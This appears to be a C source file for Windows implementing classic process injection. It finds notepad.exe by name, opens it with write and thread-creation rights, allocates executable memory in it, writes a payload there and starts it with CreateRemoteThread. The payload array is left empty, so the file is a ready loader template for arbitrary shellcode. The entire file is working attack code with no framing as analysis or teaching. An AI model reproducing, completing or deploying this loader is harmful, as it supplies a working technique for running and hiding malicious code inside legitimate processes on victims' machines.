#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

int find_proc(const char *name)
{
	int pid = 0; 
	PROCESSENTRY32 processEntry; 
	processEntry.dwSize = sizeof(PROCESSENTRY32); 
	
	// take a snapshot for all processes in the system 
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0; 
	
	if (!Process32First(hSnapshot, &processEntry)) {
		CloseHandle(hSnapshot); 
		return 0; 
	}
	
	while (Process32Next(hSnapshot, &processEntry)) {
		if (lstrcmpiA(processEntry.szExeFile, name) == 0) {
			// printf("name = %s\n", processEntry.szExeFile); 
			pid = processEntry.th32ProcessID; 
			// printf("pid = %d\n", pid); 
			break; 
		}
	}
	
	CloseHandle(hSnapshot);
	return pid; 
}

int inject_code(HANDLE hProc, unsigned char *payload, unsigned int payload_sz)
{
	// allocate space within the target process	
	LPVOID mem = VirtualAllocEx(hProc, NULL, payload_sz, MEM_COMMIT, PAGE_EXECUTE_READ); 
	
	// write memory  
	WriteProcessMemory(hProc, mem, (PVOID) payload, (SIZE_T) payload_sz, (SIZE_T *) NULL); 
	
	// execute
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, mem, NULL, 0, NULL); 
	
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500); 
		CloseHandle(hThread); 
		return 0; 
	}
	
	return -1; 
}

int main(void)
{	
	unsigned char payload[] = {
		
	};
	unsigned int payload_sz = sizeof(payload); 
	int pid = find_proc("notepad.exe"); 
	
	if (pid) {
		
		// open an existing process, return an open handle  
		HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid); 
	
		if (hProc != NULL) {
			inject_code(hProc, payload, payload_sz); 
			CloseHandle(hProc); 
		}
	}
	
	return 0; 
}
